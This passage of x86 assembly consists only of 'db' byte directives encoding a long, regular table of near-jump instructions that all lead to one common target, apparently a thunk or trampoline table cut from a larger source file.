    db 0C6h,00h,00h,0E9h,87h,0C6h,00h,00h,0E9h,82h,0C6h,00h,00h,0E9h,7Dh,0C6h
    db 00h,00h,0E9h,78h,0C6h,00h,00h,0E9h,73h,0C6h,00h,00h,0E9h,6Eh,0C6h,00h
    db 00h,0E9h,69h,0C6h,00h,00h,0E9h,64h,0C6h,00h,00h,0E9h,5Fh,0C6h,00h,00h
    db 0E9h,5Ah,0C6h,00h,00h,0E9h,55h,0C6h,00h,00h,0E9h,50h,0C6h,00h,00h,0E9h
    db 4Bh,0C6h,00h,00h,0E9h,46h,0C6h,00h,00h,0E9h,41h,0C6h,00h,00h,0E9h,3Ch
    db 0C6h,00h,00h,0E9h,37h,0C6h,00h,00h,0E9h,32h,0C6h,00h,00h,0E9h,2Dh,0C6h
    db 00h,00h,0E9h,28h,0C6h,00h,00h,0E9h,23h,0C6h,00h,00h,0E9h,1Eh,0C6h,00h
    db 00h,0E9h,19h,0C6h,00h,00h,0E9h,14h,0C6h,00h,00h,0E9h,0Fh,0C6h,00h,00h
    db 0E9h,0Ah,0C6h,00h,00h,0E9h,05h,0C6h,00h,00h,0E9h,00h,0C6h,00h,00h,0E9h
    db 0FBh,0C5h,00h,00h,0E9h,0F6h,0C5h,00h,00h,0E9h,0F1h,0C5h,00h,00h,0E9h,0ECh
    db 0C5h,00h,00h,0E9h,0E7h,0C5h,00h,00h,0E9h,0E2h,0C5h,00h,00h,0E9h,0DDh,0C5h
    db 00h,00h,0E9h,0D8h,0C5h,00h,00h,0E9h,0D3h,0C5h,00h,00h,0E9h,0CEh,0C5h,00h
    db 00h,0E9h,0C9h,0C5h,00h,00h,0E9h,0C4h,0C5h,00h,00h,0E9h,0BFh,0C5h,00h,00h
    db 0E9h,0BAh,0C5h,00h,00h,0E9h,0B5h,0C5h,00h,00h,0E9h,0B0h,0C5h,00h,00h,0E9h
    db 0ABh,0C5h,00h,00h,0E9h,0A6h,0C5h,00h,00h,0E9h,0A1h,0C5h,00h,00h,0E9h,9Ch
    db 0C5h,00h,00h,0E9h,97h,0C5h,00h,00h,0E9h,92h,0C5h,00h,00h,0E9h,8Dh,0C5h
    db 00h,00h,0E9h,88h,0C5h,00h,00h,0E9h,83h,0C5h,00h,00h,0E9h,7Eh,0C5h,00h
    db 00h,0E9h,79h,0C5h,00h,00h,0E9h,74h,0C5h,00h,00h,0E9h,6Fh,0C5h,00h,00h
    db 0E9h,6Ah,0C5h,00h,00h,0E9h,65h,0C5h,00h,00h,0E9h,60h,0C5h,00h,00h,0E9h
    db 5Bh,0C5h,00h,00h,0E9h,56h,0C5h,00h,00h,0E9h,51h,0C5h,00h,00h,0E9h,4Ch
    db 0C5h,00h,00h,0E9h,47h,0C5h,00h,00h,0E9h,42h,0C5h,00h,00h,0E9h,3Dh,0C5h
    db 00h,00h,0E9h,38h,0C5h,00h,00h,0E9h,33h,0C5h,00h,00h,0E9h,2Eh,0C5h,00h
    db 00h,0E9h,29h,0C5h,00h,00h,0E9h,24h,0C5h,00h,00h,0E9h,1Fh,0C5h,00h,00h
    db 0E9h,1Ah,0C5h,00h,00h,0E9h,15h,0C5h,00h,00h,0E9h,10h,0C5h,00h,00h,0E9h
    db 0Bh,0C5h,00h,00h,0E9h,06h,0C5h,00h,00h,0E9h,01h,0C5h,00h,00h,0E9h,0FCh
    db 0C4h,00h,00h,0E9h,0F7h,0C4h,00h,00h,0E9h,0F2h,0C4h,00h,00h,0E9h,0EDh,0C4h
    db 00h,00h,0E9h,0E8h,0C4h,00h,00h,0E9h,0E3h,0C4h,00h,00h,0E9h,0DEh,0C4h,00h
    db 00h,0E9h,0D9h,0C4h,00h,00h,0E9h,0D4h,0C4h,00h,00h,0E9h,0CFh,0C4h,00h,00h
    db 0E9h,0CAh,0C4h,00h,00h,0E9h,0C5h,0C4h,00h,00h,0E9h,0C0h,0C4h,00h,00h,0E9h
    db 0BBh,0C4h,00h,00h,0E9h,0B6h,0C4h,00h,00h,0E9h,0B1h,0C4h,00h,00h,0E9h,0ACh
    db 0C4h,00h,00h,0E9h,0A7h,0C4h,00h,00h,0E9h,0A2h,0C4h,00h,00h,0E9h,9Dh,0C4h
    db 00h,00h,0E9h,98h,0C4h,00h,00h,0E9h,93h,0C4h,00h,00h,0E9h,8Eh,0C4h,00h
    db 00h,0E9h,89h,0C4h,00h,00h,0E9h,84h,0C4h,00h,00h,0E9h,7Fh,0C4h,00h,00h
    db 0E9h,7Ah,0C4h,00h,00h,0E9h,75h,0C4h,00h,00h,0E9h,70h,0C4h,00h,00h,0E9h
    db 6Bh,0C4h,00h,00h,0E9h,66h,0C4h,00h,00h,0E9h,61h,0C4h,00h,00h,0E9h,5Ch
    db 0C4h,00h,00h,0E9h,57h,0C4h,00h,00h,0E9h,52h,0C4h,00h,00h,0E9h,4Dh,0C4h
    db 00h,00h,0E9h,48h,0C4h,00h,00h,0E9h,43h,0C4h,00h,00h,0E9h,3Eh,0C4h,00h
    db 00h,0E9h,39h,0C4h,00h,00h,0E9h,34h,0C4h,00h,00h,0E9h,2Fh,0C4h,00h,00h
    db 0E9h,2Ah,0C4h,00h,00h,0E9h,25h,0C4h,00h,00h,0E9h,20h,0C4h,00h,00h,0E9h
    db 1Bh,0C4h,00h,00h,0E9h,16h,0C4h,00h,00h,0E9h,11h,0C4h,00h,00h,0E9h,0Ch
    db 0C4h,00h,00h,0E9h,07h,0C4h,00h,00h,0E9h,02h,0C4h,00h,00h,0E9h,0FDh,0C3h
    db 00h,00h,0E9h,0F8h,0C3h,00h,00h,0E9h,0F3h,0C3h,00h,00h,0E9h,0EEh,0C3h,00h
    db 00h,0E9h,0E9h,0C3h,00h,00h,0E9h,0E4h,0C3h,00h,00h,0E9h,0DFh,0C3h,00h,00h
    db 0E9h,0DAh,0C3h,00h,00h,0E9h,0D5h,0C3h,00h,00h,0E9h,0D0h,0C3h,00h,00h,0E9h
    db 0CBh,0C3h,00h,00h,0E9h,0C6h,0C3h,00h,00h,0E9h,0C1h,0C3h,00h,00h,0E9h,0BCh
    db 0C3h,00h,00h,0E9h,0B7h,0C3h,00h,00h,0E9h,0B2h,0C3h,00h,00h,0E9h,0ADh,0C3h
    db 00h,00h,0E9h,0A8h,0C3h,00h,00h,0E9h,0A3h,0C3h,00h,00h,0E9h,9Eh,0C3h,00h
    db 00h,0E9h,99h,0C3h,00h,00h,0E9h,94h,0C3h,00h,00h,0E9h,8Fh,0C3h,00h,00h
    db 0E9h,8Ah,0C3h,00h,00h,0E9h,85h,0C3h,00h,00h,0E9h,80h,0C3h,00h,00h,0E9h
    db 7Bh,0C3h,00h,00h,0E9h,76h,0C3h,00h,00h,0E9h,71h,0C3h,00h,00h,0E9h,6Ch
    db 0C3h,00h,00h,0E9h,67h,0C3h,00h,00h,0E9h,62h,0C3h,00h,00h,0E9h,5Dh,0C3h
    db 00h,00h,0E9h,58h,0C3h,00h,00h,0E9h,53h,0C3h,00h,00h,0E9h,4Eh,0C3h,00h
    db 00h,0E9h,49h,0C3h,00h,00h,0E9h,44h,0C3h,00h,00h,0E9h,3Fh,0C3h,00h,00h
    db 0E9h,3Ah,0C3h,00h,00h,0E9h,35h,0C3h,00h,00h,0E9h,30h,0C3h,00h,00h,0E9h
    db 2Bh,0C3h,00h,00h,0E9h,26h,0C3h,00h,00h,0E9h,21h,0C3h,00h,00h,0E9h,1Ch
    db 0C3h,00h,00h,0E9h,17h,0C3h,00h,00h,0E9h,12h,0C3h,00h,00h,0E9h,0Dh,0C3h
    db 00h,00h,0E9h,08h,0C3h,00h,00h,0E9h,03h,0C3h,00h,00h,0E9h,0FEh,0C2h,00h
    db 00h,0E9h,0F9h,0C2h,00h,00h,0E9h,0F4h,0C2h,00h,00h,0E9h,0EFh,0C2h,00h,00h
    db 0E9h,0EAh,0C2h,00h,00h,0E9h,0E5h,0C2h,00h,00h,0E9h,0E0h,0C2h,00h,00h,0E9h
    db 0DBh,0C2h,00h,00h,0E9h,0D6h,0C2h,00h,00h,0E9h,0D1h,0C2h,00h,00h,0E9h,0CCh
    db 0C2h,00h,00h,0E9h,0C7h,0C2h,00h,00h,0E9h,0C2h,0C2h,00h,00h,0E9h,0BDh,0C2h
    db 00h,00h,0E9h,0B8h,0C2h,00h,00h,0E9h,0B3h,0C2h,00h,00h,0E9h,0AEh,0C2h,00h
    db 00h,0E9h,0A9h,0C2h,00h,00h,0E9h,0A4h,0C2h,00h,00h,0E9h,9Fh,0C2h,00h,00h
    db 0E9h,9Ah,0C2h,00h,00h,0E9h,95h,0C2h,00h,00h,0E9h,90h,0C2h,00h,00h,0E9h
    db 8Bh,0C2h,00h,00h,0E9h,86h,0C2h,00h,00h,0E9h,81h,0C2h,00h,00h,0E9h,7Ch
    db 0C2h,00h,00h,0E9h,77h,0C2h,00h,00h,0E9h,72h,0C2h,00h,00h,0E9h,6Dh,0C2h
    db 00h,00h,0E9h,68h,0C2h,00h,00h,0E9h,63h,0C2h,00h,00h,0E9h,5Eh,0C2h,00h
    db 00h,0E9h,59h,0C2h,00h,00h,0E9h,54h,0C2h,00h,00h,0E9h,4Fh,0C2h,00h,00h
    db 0E9h,4Ah,0C2h,00h,00h,0E9h,45h,0C2h,00h,00h,0E9h,40h,0C2h,00h,00h,0E9h
    db 3Bh,0C2h,00h,00h,0E9h,36h,0C2h,00h,00h,0E9h,31h,0C2h,00h,00h,0E9h,2Ch
    db 0C2h,00h,00h,0E9h,27h,0C2h,00h,00h,0E9h,22h,0C2h,00h,00h,0E9h,1Dh,0C2h
    db 00h,00h,0E9h,18h,0C2h,00h,00h,0E9h,13h,0C2h,00h,00h,0E9h,0Eh,0C2h,00h
    db 00h,0E9h,09h,0C2h,00h,00h,0E9h,04h,0C2h,00h,00h,0E9h,0FFh,0C1h,00h,00h
    db 0E9h,0FAh,0C1h,00h,00h,0E9h,0F5h,0C1h,00h,00h,0E9h,0F0h,0C1h,00h,00h,0E9h
    db 0EBh,0C1h,00h,00h,0E9h,0E6h,0C1h,00h,00h,0E9h,0E1h,0C1h,00h,00h,0E9h,0DCh
    db 0C1h,00h,00h,0E9h,0D7h,0C1h,00h,00h,0E9h,0D2h,0C1h,00h,00h,0E9h,0CDh,0C1h
    db 00h,00h,0E9h,0C8h,0C1h,00h,00h,0E9h,0C3h,0C1h,00h,00h,0E9h,0BEh,0C1h,00h
    db 00h,0E9h,0B9h,0C1h,00h,00h,0E9h,0B4h,0C1h,00h,00h,0E9h,0AFh,0C1h,00h,00h
    db 0E9h,0AAh,0C1h,00h,00h,0E9h,0A5h,0C1h,00h,00h,0E9h,0A0h,0C1h,00h,00h,0E9h
    db 9Bh,0C1h,00h,00h,0E9h,96h,0C1h,00h,00h,0E9h,91h,0C1h,00h,00h,0E9h,8Ch
    db 0C1h,00h,00h,0E9h,87h,0C1h,00h,00h,0E9h,82h,0C1h,00h,00h,0E9h,7Dh,0C1h
    db 00h,00h,0E9h,78h,0C1h,00h,00h,0E9h,73h,0C1h,00h,00h,0E9h,6Eh,0C1h,00h
    db 00h,0E9h,69h,0C1h,00h,00h,0E9h,64h,0C1h,00h,00h,0E9h,5Fh,0C1h,00h,00h
    db 0E9h,5Ah,0C1h,00h,00h,0E9h,55h,0C1h,00h,00h,0E9h,50h,0C1h,00h,00h,0E9h
    db 4Bh,0C1h,00h,00h,0E9h,46h,0C1h,00h,00h,0E9h,41h,0C1h,00h,00h,0E9h,3Ch
    db 0C1h,00h,00h,0E9h,37h,0C1h,00h,00h,0E9h,32h,0C1h,00h,00h,0E9h,2Dh,0C1h
    db 00h,00h,0E9h,28h,0C1h,00h,00h,0E9h,23h,0C1h,00h,00h,0E9h,1Eh,0C1h,00h
    db 00h,0E9h,19h,0C1h,00h,00h,0E9h,14h,0C1h,00h,00h,0E9h,0Fh,0C1h,00h,00h
    db 0E9h,0Ah,0C1h,00h,00h,0E9h,05h,0C1h,00h,00h,0E9h,00h,0C1h,00h,00h,0E9h
    db 0FBh,0C0h,00h,00h,0E9h,0F6h,0C0h,00h,00h,0E9h,0F1h,0C0h,00h,00h,0E9h,0ECh
    db 0C0h,00h,00h,0E9h,0E7h,0C0h,00h,00h,0E9h,0E2h,0C0h,00h,00h,0E9h,0DDh,0C0h
    db 00h,00h,0E9h,0D8h,0C0h,00h,00h,0E9h,0D3h,0C0h,00h,00h,0E9h,0CEh,0C0h,00h
    db 00h,0E9h,0C9h,0C0h,00h,00h,0E9h,0C4h,0C0h,00h,00h,0E9h,0BFh,0C0h,00h,00h
    db 0E9h,0BAh,0C0h,00h,00h,0E9h,0B5h,0C0h,00h,00h,0E9h,0B0h,0C0h,00h,00h,0E9h
    db 0ABh,0C0h,00h,00h,0E9h,0A6h,0C0h,00h,00h,0E9h,0A1h,0C0h,00h,00h,0E9h,9Ch
    db 0C0h,00h,00h,0E9h,97h,0C0h,00h,00h,0E9h,92h,0C0h,00h,00h,0E9h,8Dh,0C0h
    db 00h,00h,0E9h,88h,0C0h,00h,00h,0E9h,83h,0C0h,00h,00h,0E9h,7Eh,0C0h,00h
    db 00h,0E9h,79h,0C0h,00h,00h,0E9h,74h,0C0h,00h,00h,0E9h,6Fh,0C0h,00h,00h
    db 0E9h,6Ah,0C0h,00h,00h,0E9h,65h,0C0h,00h,00h,0E9h,60h,0C0h,00h,00h,0E9h
    db 5Bh,0C0h,00h,00h,0E9h,56h,0C0h,00h,00h,0E9h,51h,0C0h,00h,00h,0E9h,4Ch
    db 0C0h,00h,00h,0E9h,47h,0C0h,00h,00h,0E9h,42h,0C0h,00h,00h,0E9h,3Dh,0C0h
    db 00h,00h,0E9h,38h,0C0h,00h,00h,0E9h,33h,0C0h,00h,00h,0E9h,2Eh,0C0h,00h
    db 00h,0E9h,29h,0C0h,00h,00h,0E9h,24h,0C0h,00h,00h,0E9h,1Fh,0C0h,00h,00h
    db 0E9h,1Ah,0C0h,00h,00h,0E9h,15h,0C0h,00h,00h,0E9h,10h,0C0h,00h,00h,0E9h
    db 0Bh,0C0h,00h,00h,0E9h,06h,0C0h,00h,00h,0E9h,01h,0C0h,00h,00h,0E9h,0FCh
    db 0BFh,00h,00h,0E9h,0F7h,0BFh,00h,00h,0E9h,0F2h,0BFh,00h,00h,0E9h,0EDh,0BFh
    db 00h,00h,0E9h,0E8h,0BFh,00h,00h,0E9h,0E3h,0BFh,00h,00h,0E9h,0DEh,0BFh,00h
    db 00h,0E9h,0D9h,0BFh,00h,00h,0E9h,0D4h,0BFh,00h,00h,0E9h,0CFh,0BFh,00h,00h
    db 0E9h,0CAh,0BFh,00h,00h,0E9h,0C5h,0BFh,00h,00h,0E9h,0C0h,0BFh,00h,00h,0E9h
    db 0BBh,0BFh,00h,00h,0E9h,0B6h,0BFh,00h,00h,0E9h,0B1h,0BFh,00h,00h,0E9h,0ACh
    db 0BFh,00h,00h,0E9h,0A7h,0BFh,00h,00h,0E9h,0A2h,0BFh,00h,00h,0E9h,9Dh,0BFh
    db 00h,00h,0E9h,98h,0BFh,00h,00h,0E9h,93h,0BFh,00h,00h,0E9h,8Eh,0BFh,00h
    db 00h,0E9h,89h,0BFh,00h,00h,0E9h,84h,0BFh,00h,00h,0E9h,7Fh,0BFh,00h,00h
    db 0E9h,7Ah,0BFh,00h,00h,0E9h,75h,0BFh,00h,00h,0E9h,70h,0BFh,00h,00h,0E9h
    db 6Bh,0BFh,00h,00h,0E9h,66h,0BFh,00h,00h,0E9h,61h,0BFh,00h,00h,0E9h,5Ch
    db 0BFh,00h,00h,0E9h,57h,0BFh,00h,00h,0E9h,52h,0BFh,00h,00h,0E9h,4Dh,0BFh
    db 00h,00h,0E9h,48h,0BFh,00h,00h,0E9h,43h,0BFh,00h,00h,0E9h,3Eh,0BFh,00h
    db 00h,0E9h,39h,0BFh,00h,00h,0E9h,34h,0BFh,00h,00h,0E9h,2Fh,0BFh,00h,00h
    db 0E9h,2Ah,0BFh,00h,00h,0E9h,25h,0BFh,00h,00h,0E9h,20h,0BFh,00h,00h,0E9h
    db 1Bh,0BFh,00h,00h,0E9h,16h,0BFh,00h,00h,0E9h,11h,0BFh,00h,00h,0E9h,0Ch
    db 0BFh,00h,00h,0E9h,07h,0BFh,00h,00h,0E9h,02h,0BFh,00h,00h,0E9h,0FDh,0BEh
    db 00h,00h,0E9h,0F8h,0BEh,00h,00h,0E9h,0F3h,0BEh,00h,00h,0E9h,0EEh,0BEh,00h
    db 00h,0E9h,0E9h,0BEh,00h,00h,0E9h,0E4h,0BEh,00h,00h,0E9h,0DFh,0BEh,00h,00h
    db 0E9h,0DAh,0BEh,00h,00h,0E9h,0D5h,0BEh,00h,00h,0E9h,0D0h,0BEh,00h,00h,0E9h
    db 0CBh,0BEh,00h,00h,0E9h,0C6h,0BEh,00h,00h,0E9h,0C1h,0BEh,00h,00h,0E9h,0BCh
    db 0BEh,00h,00h,0E9h,0B7h,0BEh,00h,00h,0E9h,0B2h,0BEh,00h,00h,0E9h,0ADh,0BEh
    db 00h,00h,0E9h,0A8h,0BEh,00h,00h,0E9h,0A3h,0BEh,00h,00h,0E9h,9Eh,0BEh,00h
    db 00h,0E9h,99h,0BEh,00h,00h,0E9h,94h,0BEh,00h,00h,0E9h,8Fh,0BEh,00h,00h
    db 0E9h,8Ah,0BEh,00h,00h,0E9h,85h,0BEh,00h,00h,0E9h,80h,0BEh,00h,00h,0E9h
    db 7Bh,0BEh,00h,00h,0E9h,76h,0BEh,00h,00h,0E9h,71h,0BEh,00h,00h,0E9h,6Ch
    db 0BEh,00h,00h,0E9h,67h,0BEh,00h,00h,0E9h,62h,0BEh,00h,00h,0E9h,5Dh,0BEh
    db 00h,00h,0E9h,58h,0BEh,00h,00h,0E9h,53h,0BEh,00h,00h,0E9h,4Eh,0BEh,00h
    db 00h,0E9h,49h,0BEh,00h,00h,0E9h,44h,0BEh,00h,00h,0E9h,3Fh,0BEh,00h,00h
    db 0E9h,3Ah,0BEh,00h,00h,0E9h,35h,0BEh,00h,00h,0E9h,30h,0BEh,00h,00h,0E9h
    db 2Bh,0BEh,00h,00h,0E9h,26h,0BEh,00h,00h,0E9h,21h,0BEh,00h,00h,0E9h,1Ch
    db 0BEh,00h,00h,0E9h,17h,0BEh,00h,00h,0E9h,12h,0BEh,00h,00h,0E9h,0Dh,0BEh
    db 00h,00h,0E9h,08h,0BEh,00h,00h,0E9h,03h,0BEh,00h,00h,0E9h,0FEh,0BDh,00h
    db 00h,0E9h,0F9h,0BDh,00h,00h,0E9h,0F4h,0BDh,00h,00h,0E9h,0EFh,0BDh,00h,00h
    db 0E9h,0EAh,0BDh,00h,00h,0E9h,0E5h,0BDh,00h,00h,0E9h,0E0h,0BDh,00h,00h,0E9h
    db 0DBh,0BDh,00h,00h,0E9h,0D6h,0BDh,00h,00h,0E9h,0D1h,0BDh,00h,00h,0E9h,0CCh
    db 0BDh,00h,00h,0E9h,0C7h,0BDh,00h,00h,0E9h,0C2h,0BDh,00h,00h,0E9h,0BDh,0BDh
    db 00h,00h,0E9h,0B8h,0BDh,00h,00h,0E9h,0B3h,0BDh,00h,00h,0E9h,0AEh,0BDh,00h
    db 00h,0E9h,0A9h,0BDh,00h,00h,0E9h,0A4h,0BDh,00h,00h,0E9h,9Fh,0BDh,00h,00h
    db 0E9h,9Ah,0BDh,00h,00h,0E9h,95h,0BDh,00h,00h,0E9h,90h,0BDh,00h,00h,0E9h
    db 8Bh,0BDh,00h,00h,0E9h,86h,0BDh,00h,00h,0E9h,81h,0BDh,00h,00h,0E9h,7Ch
    db 0BDh,00h,00h,0E9h,77h,0BDh,00h,00h,0E9h,72h,0BDh,00h,00h,0E9h,6Dh,0BDh
    db 00h,00h,0E9h,68h,0BDh,00h,00h,0E9h,63h,0BDh,00h,00h,0E9h,5Eh,0BDh,00h
    db 00h,0E9h,59h,0BDh,00h,00h,0E9h,54h,0BDh,00h,00h,0E9h,4Fh,0BDh,00h,00h
    db 0E9h,4Ah,0BDh,00h,00h,0E9h,45h,0BDh,00h,00h,0E9h,40h,0BDh,00h,00h,0E9h
    db 3Bh,0BDh,00h,00h,0E9h,36h,0BDh,00h,00h,0E9h,31h,0BDh,00h,00h,0E9h,2Ch
    db 0BDh,00h,00h,0E9h,27h,0BDh,00h,00h,0E9h,22h,0BDh,00h,00h,0E9h,1Dh,0BDh
    db 00h,00h,0E9h,18h,0BDh,00h,00h,0E9h,13h,0BDh,00h,00h,0E9h,0Eh,0BDh,00h
    db 00h,0E9h,09h,0BDh,00h,00h,0E9h,04h,0BDh,00h,00h,0E9h,0FFh,0BCh,00h,00h
    db 0E9h,0FAh,0BCh,00h,00h,0E9h,0F5h,0BCh,00h,00h,0E9h,0F0h,0BCh,00h,00h,0E9h
    db 0EBh,0BCh,00h,00h,0E9h,0E6h,0BCh,00h,00h,0E9h,0E1h,0BCh,00h,00h,0E9h,0DCh
    db 0BCh,00h,00h,0E9h,0D7h,0BCh,00h,00h,0E9h,0D2h,0BCh,00h,00h,0E9h,0CDh,0BCh
    db 00h,00h,0E9h,0C8h,0BCh,00h,00h,0E9h,0C3h,0BCh,00h,00h,0E9h,0BEh,0BCh,00h
    db 00h,0E9h,0B9h,0BCh,00h,00h,0E9h,0B4h,0BCh,00h,00h,0E9h,0AFh,0BCh,00h,00h
    db 0E9h,0AAh,0BCh,00h,00h,0E9h,0A5h,0BCh,00h,00h,0E9h,0A0h,0BCh,00h,00h,0E9h
    db 9Bh,0BCh,00h,00h,0E9h,96h,0BCh,00h,00h,0E9h,91h,0BCh,00h,00h,0E9h,8Ch
    db 0BCh,00h,00h,0E9h,87h,0BCh,00h,00h,0E9h,82h,0BCh,00h,00h,0E9h,7Dh,0BCh
    db 00h,00h,0E9h,78h,0BCh,00h,00h,0E9h,73h,0BCh,00h,00h,0E9h,6Eh,0BCh,00h
    db 00h,0E9h,69h,0BCh,00h,00h,0E9h,64h,0BCh,00h,00h,0E9h,5Fh,0BCh,00h,00h
    db 0E9h,5Ah,0BCh,00h,00h,0E9h,55h,0BCh,00h,00h,0E9h,50h,0BCh,00h,00h,0E9h
    db 4Bh,0BCh,00h,00h,0E9h,46h,0BCh,00h,00h,0E9h,41h,0BCh,00h,00h,0E9h,3Ch
    db 0BCh,00h,00h,0E9h,37h,0BCh,00h,00h,0E9h,32h,0BCh,00h,00h,0E9h,2Dh,0BCh
    db 00h,00h,0E9h,28h,0BCh,00h,00h,0E9h,23h,0BCh,00h,00h,0E9h,1Eh,0BCh,00h
    db 00h,0E9h,19h,0BCh,00h,00h,0E9h,14h,0BCh,00h,00h,0E9h,0Fh,0BCh,00h,00h
    db 0E9h,0Ah,0BCh,00h,00h,0E9h,05h,0BCh,00h,00h,0E9h,00h,0BCh,00h,00h,0E9h
    db 0FBh,0BBh,00h,00h,0E9h,0F6h,0BBh,00h,00h,0E9h,0F1h,0BBh,00h,00h,0E9h,0ECh
    db 0BBh,00h,00h,0E9h,0E7h,0BBh,00h,00h,0E9h,0E2h,0BBh,00h,00h,0E9h,0DDh,0BBh
    db 00h,00h,0E9h,0D8h,0BBh,00h,00h,0E9h,0D3h,0BBh,00h,00h,0E9h,0CEh,0BBh,00h
    db 00h,0E9h,0C9h,0BBh,00h,00h,0E9h,0C4h,0BBh,00h,00h,0E9h,0BFh,0BBh,00h,00h
    db 0E9h,0BAh,0BBh,00h,00h,0E9h,0B5h,0BBh,00h,00h,0E9h,0B0h,0BBh,00h,00h,0E9h
    db 0ABh,0BBh,00h,00h,0E9h,0A6h,0BBh,00h,00h,0E9h,0A1h,0BBh,00h,00h,0E9h,9Ch
    db 0BBh,00h,00h,0E9h,97h,0BBh,00h,00h,0E9h,92h,0BBh,00h,00h,0E9h,8Dh,0BBh
    db 00h,00h,0E9h,88h,0BBh,00h,00h,0E9h,83h,0BBh,00h,00h,0E9h,7Eh,0BBh,00h
    db 00h,0E9h,79h,0BBh,00h,00h,0E9h,74h,0BBh,00h,00h,0E9h,6Fh,0BBh,00h,00h
    db 0E9h,6Ah,0BBh,00h,00h,0E9h,65h,0BBh,00h,00h,0E9h,60h,0BBh,00h,00h,0E9h
    db 5Bh,0BBh,00h,00h,0E9h,56h,0BBh,00h,00h,0E9h,51h,0BBh,00h,00h,0E9h,4Ch
    db 0BBh,00h,00h,0E9h,47h,0BBh,00h,00h,0E9h,42h,0BBh,00h,00h,0E9h,3Dh,0BBh
    db 00h,00h,0E9h,38h,0BBh,00h,00h,0E9h,33h,0BBh,00h,00h,0E9h,2Eh,0BBh,00h
    db 00h,0E9h,29h,0BBh,00h,00h,0E9h,24h,0BBh,00h,00h,0E9h,1Fh,0BBh,00h,00h
    db 0E9h,1Ah,0BBh,00h,00h,0E9h,15h,0BBh,00h,00h,0E9h,10h,0BBh,00h,00h,0E9h
    db 0Bh,0BBh,00h,00h,0E9h,06h,0BBh,00h,00h,0E9h,01h,0BBh,00h,00h,0E9h,0FCh
    db 0BAh,00h,00h,0E9h,0F7h,0BAh,00h,00h,0E9h,0F2h,0BAh,00h,00h,0E9h,0EDh,0BAh
    db 00h,00h,0E9h,0E8h,0BAh,00h,00h,0E9h,0E3h,0BAh,00h,00h,0E9h,0DEh,0BAh,00h
    db 00h,0E9h,0D9h,0BAh,00h,00h,0E9h,0D4h,0BAh,00h,00h,0E9h,0CFh,0BAh,00h,00h
    db 0E9h,0CAh,0BAh,00h,00h,0E9h,0C5h,0BAh,00h,00h,0E9h,0C0h,0BAh,00h,00h,0E9h
    db 0BBh,0BAh,00h,00h,0E9h,0B6h,0BAh,00h,00h,0E9h,0B1h,0BAh,00h,00h,0E9h,0ACh
    db 0BAh,00h,00h,0E9h,0A7h,0BAh,00h,00h,0E9h,0A2h,0BAh,00h,00h,0E9h,9Dh,0BAh
    db 00h,00h,0E9h,98h,0BAh,00h,00h,0E9h,93h,0BAh,00h,00h,0E9h,8Eh,0BAh,00h
    db 00h,0E9h,89h,0BAh,00h,00h,0E9h,84h,0BAh,00h,00h,0E9h,7Fh,0BAh,00h,00h
    db 0E9h,7Ah,0BAh,00h,00h,0E9h,75h,0BAh,00h,00h,0E9h,70h,0BAh,00h,00h,0E9h
    db 6Bh,0BAh,00h,00h,0E9h,66h,0BAh,00h,00h,0E9h,61h,0BAh,00h,00h,0E9h,5Ch
    db 0BAh,00h,00h,0E9h,57h,0BAh,00h,00h,0E9h,52h,0BAh,00h,00h,0E9h,4Dh,0BAh
    db 00h,00h,0E9h,48h,0BAh,00h,00h,0E9h,43h,0BAh,00h,00h,0E9h,3Eh,0BAh,00h
    db 00h,0E9h,39h,0BAh,00h,00h,0E9h,34h,0BAh,00h,00h,0E9h,2Fh,0BAh,00h,00h
    db 0E9h,2Ah,0BAh,00h,00h,0E9h,25h,0BAh,00h,00h,0E9h,20h,0BAh,00h,00h,0E9h
    db 1Bh,0BAh,00h,00h,0E9h,16h,0BAh,00h,00h,0E9h,11h,0BAh,00h,00h,0E9h,0Ch
    db 0BAh,00h,00h,0E9h,07h,0BAh,00h,00h,0E9h,02h,0BAh,00h,00h,0E9h,0FDh,0B9h
    db 00h,00h,0E9h,0F8h,0B9h,00h,00h,0E9h,0F3h,0B9h,00h,00h,0E9h,0EEh,0B9h,00h
    db 00h,0E9h,0E9h,0B9h,00h,00h,0E9h,0E4h,0B9h,00h,00h,0E9h,0DFh,0B9h,00h,00h
    db 0E9h,0DAh,0B9h,00h,00h,0E9h,0D5h,0B9h,00h,00h,0E9h,0D0h,0B9h,00h,00h,0E9h
    db 0CBh,0B9h,00h,00h,0E9h,0C6h,0B9h,00h,00h,0E9h,0C1h,0B9h,00h,00h,0E9h,0BCh
    db 0B9h,00h,00h,0E9h,0B7h,0B9h,00h,00h,0E9h,0B2h,0B9h,00h,00h,0E9h,0ADh,0B9h
    db 00h,00h,0E9h,0A8h,0B9h,00h,00h,0E9h,0A3h,0B9h,00h,00h,0E9h,9Eh,0B9h,00h
    db 00h,0E9h,99h,0B9h,00h,00h,0E9h,94h,0B9h,00h,00h,0E9h,8Fh,0B9h,00h,00h
    db 0E9h,8Ah,0B9h,00h,00h,0E9h,85h,0B9h,00h,00h,0E9h,80h,0B9h,00h,00h,0E9h
    db 7Bh,0B9h,00h,00h,0E9h,76h,0B9h,00h,00h,0E9h,71h,0B9h,00h,00h,0E9h,6Ch
    db 0B9h,00h,00h,0E9h,67h,0B9h,00h,00h,0E9h,62h,0B9h,00h,00h,0E9h,5Dh,0B9h
    db 00h,00h,0E9h,58h,0B9h,00h,00h,0E9h,53h,0B9h,00h,00h,0E9h,4Eh,0B9h,00h
    db 00h,0E9h,49h,0B9h,00h,00h,0E9h,44h,0B9h,00h,00h,0E9h,3Fh,0B9h,00h,00h
    db 0E9h,3Ah,0B9h,00h,00h,0E9h,35h,0B9h,00h,00h,0E9h,30h,0B9h,00h,00h,0E9h
    db 2Bh,0B9h,00h,00h,0E9h,26h,0B9h,00h,00h,0E9h,21h,0B9h,00h,00h,0E9h,1Ch
    db 0B9h,00h,00h,0E9h,17h,0B9h,00h,00h,0E9h,12h,0B9h,00h,00h,0E9h,0Dh,0B9h
    db 00h,00h,0E9h,08h,0B9h,00h,00h,0E9h,03h,0B9h,00h,00h,0E9h,0FEh,0B8h,00h
    db 00h,0E9h,0F9h,0B8h,00h,00h,0E9h,0F4h,0B8h,00h,00h,0E9h,0EFh,0B8h,00h,00h
    db 0E9h,0EAh,0B8h,00h,00h,0E9h,0E5h,0B8h,00h,00h,0E9h,0E0h,0B8h,00h,00h,0E9h
    db 0DBh,0B8h,00h,00h,0E9h,0D6h,0B8h,00h,00h,0E9h,0D1h,0B8h,00h,00h,0E9h,0CCh
    db 0B8h,00h,00h,0E9h,0C7h,0B8h,00h,00h,0E9h,0C2h,0B8h,00h,00h,0E9h,0BDh,0B8h
